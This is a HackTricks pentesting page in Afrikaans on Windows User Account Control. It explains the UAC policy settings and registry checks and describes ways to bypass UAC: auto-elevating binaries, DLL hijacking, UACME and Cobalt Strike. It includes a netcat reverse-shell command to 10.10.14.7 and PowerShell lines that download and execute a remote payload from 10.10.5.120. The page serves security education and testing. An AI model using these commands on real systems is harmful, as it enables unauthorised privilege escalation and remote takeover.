# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) om maklik **werkvloei** te bou en te **automate** wat deur die wêreld se **mees gevorderde** gemeenskapstools aangedryf word.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n kenmerk wat 'n **toestemming prompt vir verhoogde aktiwiteite** moontlik maak. Toepassings het verskillende `integrity` vlakke, en 'n program met 'n **hoë vlak** kan take uitvoer wat **potensieel die stelsel kan kompromitteer**. Wanneer UAC geaktiveer is, loop toepassings en take altyd **onder die sekuriteitskonteks van 'n nie-administrateur rekening** tensy 'n administrateur eksplisiet hierdie toepassings/take magtig om administrateurvlak toegang tot die stelsel te hê om te loop. Dit is 'n geriefkenmerk wat administrateurs beskerm teen onbedoelde veranderinge, maar word nie as 'n sekuriteitsgrens beskou nie.

Vir meer inligting oor integriteitsvlakke:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wanneer UAC in plek is, ontvang 'n administrateur gebruiker 2 tokens: 'n standaard gebruiker sleutel, om gereelde aksies as 'n gereelde vlak uit te voer, en een met die admin voorregte.

Hierdie [bladsy](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek hoe UAC in groot diepte werk en sluit die aanmeldproses, gebruikerservaring, en UAC argitektuur in. Administrateurs kan sekuriteitsbeleide gebruik om te configureer hoe UAC spesifiek vir hul organisasie op die plaaslike vlak werk (met behulp van secpol.msc), of geconfigureer en versprei via Groep Beleidsobjekte (GPO) in 'n Aktiewe Directory domein omgewing. Die verskillende instellings word in detail [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) bespreek. Daar is 10 Groep Beleidsinstellings wat vir UAC gestel kan word. Die volgende tabel bied addisionele besonderhede:

| Groep Beleidsinstelling                                                                                                                                                                                                                                                                                                                                                           | Registrasie Sleutel         | Standaard Instelling                                         |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deaktiveer                                                  |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deaktiveer                                                  |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Vra om toestemming vir nie-Windows binaries                 |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Vra om geloofsbriewe op die veilige desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Geaktiveer (standaard vir huis) Deaktiveer (standaard vir onderneming) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deaktiveer                                                  |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Geaktiveer                                                 |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Geaktiveer                                                 |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Geaktiveer                                                 |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Geaktiveer                                                 |

### UAC Bypass Theory

Sommige programme word **automaties verhoog** as die **gebruiker behoort** tot die **administrateur groep**. Hierdie binaries het binne hul _**Manifests**_ die _**autoElevate**_ opsie met die waarde _**True**_. Die binary moet ook **onderteken wees deur Microsoft**.

Dan, om die **UAC** te **omseil** (verhoog van **medium** integriteitsvlak **na hoog**) gebruik sommige aanvallers hierdie soort binaries om **arbitraire kode** uit te voer omdat dit vanaf 'n **Hoë vlak integriteitsproses** uitgevoer sal word.

Jy kan die _**Manifest**_ van 'n binary nagaan met die hulpmiddel _**sigcheck.exe**_ van Sysinternals. En jy kan die **integriteitsvlak** van die prosesse sien met _Process Explorer_ of _Process Monitor_ (van Sysinternals).

### Check UAC

Om te bevestig of UAC geaktiveer is, doen:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
As dit **`1`** is, dan is UAC **geaktiveer**, as dit **`0`** is of dit **nie bestaan** nie, dan is UAC **inaktief**.

Kontroleer dan **watter vlak** geconfigureer is:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- As **`0`** dan, UAC sal nie vra nie (soos **deaktiveer**)
- As **`1`** word die admin **gevra vir gebruikersnaam en wagwoord** om die binêre met hoë regte uit te voer (op Secure Desktop)
- As **`2`** (**Altijd my kennisgewing**) sal UAC altyd om bevestiging van die administrateur vra wanneer hy probeer om iets met hoë regte uit te voer (op Secure Desktop)
- As **`3`** soos `1` maar nie noodsaaklik op Secure Desktop nie
- As **`4`** soos `2` maar nie noodsaaklik op Secure Desktop nie
- as **`5`**(**standaard**) sal dit die administrateur vra om te bevestig om nie-Windows binêre met hoë regte uit te voer

Dan, moet jy na die waarde van **`LocalAccountTokenFilterPolicy`** kyk\
As die waarde **`0`** is, dan kan slegs die **RID 500** gebruiker (**ingeboude Administrateur**) **admin take sonder UAC** uitvoer, en as dit `1` is, kan **alle rekeninge binne die "Administrators"** groep dit doen.

En, laastens kyk na die waarde van die sleutel **`FilterAdministratorToken`**\
As **`0`**(standaard), kan die **ingeboude Administrateur rekening** afstandsadministrasietake doen en as **`1`** kan die ingeboude rekening Administrateur **nie** afstandsadministrasietake doen nie, tensy `LocalAccountTokenFilterPolicy` op `1` gestel is.

#### Samevatting

- As `EnableLUA=0` of **nie bestaan nie**, **geen UAC vir enigiemand**
- As `EnableLua=1` en **`LocalAccountTokenFilterPolicy=1`, Geen UAC vir enigiemand**
- As `EnableLua=1` en **`LocalAccountTokenFilterPolicy=0` en `FilterAdministratorToken=0`, Geen UAC vir RID 500 (Inggeboude Administrateur)**
- As `EnableLua=1` en **`LocalAccountTokenFilterPolicy=0` en `FilterAdministratorToken=1`, UAC vir almal**

Al hierdie inligting kan versamel word met die **metasploit** module: `post/windows/gather/win_privs`

Jy kan ook die groepe van jou gebruiker nagaan en die integriteitsvlak kry:
```
net user %username%
whoami /groups | findstr Level
```
## UAC omseiling

> [!NOTE]
> Let daarop dat as jy grafiese toegang tot die slagoffer het, UAC omseiling eenvoudig is, aangesien jy net op "Ja" kan klik wanneer die UAC-prompt verskyn.

Die UAC omseiling is nodig in die volgende situasie: **die UAC is geaktiveer, jou proses loop in 'n medium integriteitskonteks, en jou gebruiker behoort tot die administrateursgroep**.

Dit is belangrik om te noem dat dit **baie moeiliker is om die UAC te omseil as dit op die hoogste sekuriteitsvlak (Altijd) is as wanneer dit op een van die ander vlakke (Standaard) is.**

### UAC gedeaktiveer

As UAC reeds gedeaktiveer is (`ConsentPromptBehaviorAdmin` is **`0`**) kan jy **'n omgekeerde skulp met administratiewe regte uitvoer** (hoë integriteitsvlak) met iets soos:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC omseiling met token duplisering

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Baie** Basiese UAC "omseiling" (volledige lêerstelselo toegang)

As jy 'n shell het met 'n gebruiker wat in die Administrators-groep is, kan jy **die C$** gedeelde via SMB (lêerstelsel) plaaslik in 'n nuwe skyf monteer en jy sal **toegang hê tot alles binne die lêerstelsel** (selfs die Administrateur se tuisgids).

> [!WARNING]
> **Dit lyk asof hierdie truuk nie meer werk nie**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC omseiling met cobalt strike

Die Cobalt Strike tegnieke sal slegs werk as UAC nie op sy maksimum sekuriteitsvlak gestel is nie.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** en **Metasploit** het ook verskeie modules om die **UAC** te **omseil**.

### KRBUACBypass

Dokumentasie en hulpmiddel in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC omseil ontploffings

[**UACME** ](https://github.com/hfiref0x/UACME) wat 'n **samestelling** van verskeie UAC omseil ontploffings is. Let daarop dat jy **UACME met visual studio of msbuild moet saamstel**. Die samestelling sal verskeie uitvoerbare lêers skep (soos `Source\Akagi\outout\x64\Debug\Akagi.exe`), jy moet weet **watter een jy nodig het.**\
Jy moet **versigtig wees** omdat sommige omseilings **ander programme kan vra** wat die **gebruiker** sal **waarsku** dat iets aan die gebeur is.

UACME het die **bou weergawe waaruit elke tegniek begin werk het**. Jy kan soek na 'n tegniek wat jou weergawes beïnvloed:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ook, deur [hierdie](https://en.wikipedia.org/wiki/Windows_10_version_history) bladsy te gebruik, kry jy die Windows weergawe `1607` van die bou weergawes.

#### Meer UAC omseilings

**Alle** die tegnieke wat hier gebruik word om AUC te omseil **vereis** 'n **volledige interaktiewe skulp** met die slagoffer (n 'gewone nc.exe skulp is nie genoeg nie).

Jy kan dit kry deur 'n **meterpreter** sessie te gebruik. Migreer na 'n **proses** wat die **Sessie** waarde gelyk is aan **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ behoort te werk)

### UAC Omseiling met GUI

As jy toegang het tot 'n **GUI kan jy net die UAC prompt aanvaar** wanneer jy dit kry, jy het regtig nie 'n omseiling nodig nie. So, toegang tot 'n GUI sal jou in staat stel om die UAC te omseil.

Boonop, as jy 'n GUI sessie kry wat iemand gebruik het (potensieel via RDP) is daar **sommige gereedskap wat as administrateur sal loop** van waar jy 'n **cmd** byvoorbeeld **as admin** direk kan **uitvoer** sonder om weer deur UAC gevra te word soos [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit mag 'n bietjie meer **stealthy** wees.

### Rumoerige brute-force UAC omseiling

As jy nie omgee om rumoerig te wees nie, kan jy altyd **iets soos** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) **loop wat vra om toestemmings te verhoog totdat die gebruiker dit aanvaar**.

### Jou eie omseiling - Basiese UAC omseiling metodologie

As jy na **UACME** kyk, sal jy opgemerk dat **meeste UAC omseilings 'n Dll Hijacking kwesbaarheid misbruik** (hoofsaaklik deur die kwaadwillige dll op _C:\Windows\System32_ te skryf). [Lees dit om te leer hoe om 'n Dll Hijacking kwesbaarheid te vind](../windows-local-privilege-escalation/dll-hijacking/).

1. Vind 'n binêre wat **autoelevate** (kyk dat wanneer dit uitgevoer word, dit in 'n hoë integriteitsvlak loop).
2. Met procmon vind "**NAAM NIE GEVIND NIE**" gebeurtenisse wat kwesbaar kan wees vir **DLL Hijacking**.
3. Jy sal waarskynlik die **DLL** binne 'n paar **beskermde paaie** (soos C:\Windows\System32) moet **skryf** waar jy nie skrywe toestemmings het nie. Jy kan dit omseil deur:
   1. **wusa.exe**: Windows 7, 8 en 8.1. Dit laat jou toe om die inhoud van 'n CAB-lêer binne beskermde paaie uit te trek (omdat hierdie hulpmiddel van 'n hoë integriteitsvlak uitgevoer word).
   2. **IFileOperation**: Windows 10.
4. Berei 'n **script** voor om jou DLL binne die beskermde pad te kopieer en die kwesbare en autoelevated binêre uit te voer.

### Nog 'n UAC omseiling tegniek

Bestaan uit om te kyk of 'n **autoElevated binêre** probeer om **te lees** van die **register** die **naam/pad** van 'n **binêre** of **opdrag** om **uitgevoer** te word (dit is meer interessant as die binêre hierdie inligting binne die **HKCU** soek).

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) om maklik te bou en **werkvloei te outomatiseer** wat deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels aangedryf word.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
